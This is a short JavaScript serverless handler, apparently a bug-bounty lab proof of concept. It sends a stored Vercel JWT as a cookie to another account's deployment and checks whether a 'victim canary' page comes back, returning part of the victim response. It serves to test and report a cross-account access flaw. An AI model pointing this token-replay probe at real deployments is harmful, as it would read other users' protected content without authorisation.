
export default async function handler(req, res) {
  const token = process.env.LAB_VERCEL_JWT;

  if (!token) {
    return res.status(500).json({
      error: "LAB_VERCEL_JWT is not configured"
    });
  }

  const target =
    "https://bb-vercel-lab-2026-9qg8-git-main-hackerone-b-by-moraz1.vercel.app/api/victim-canary";

  try {
    const response = await fetch(target, {
      method: "GET",
      headers: {
        Cookie: `_vercel_jwt=${token}`
      },
      redirect: "manual",
      cache: "no-store"
    });

    const body = await response.text();

    return res.status(200).json({
      caller: "ACCOUNT_A",
      environment: process.env.VERCEL_ENV || null,
      token_present: true,
      target_status: response.status,
      location_present: Boolean(
        response.headers.get("location")
      ),
      victim_canary_detected: body.includes("VICTIM_CANARY"),
      victim_response: body.includes("VICTIM_CANARY")
        ? body.slice(0, 500)
        : null
    });
  } catch (error) {
    return res.status(502).json({
      error: "Request failed",
      message: String(error.message).slice(0, 200)
    });
  }
}
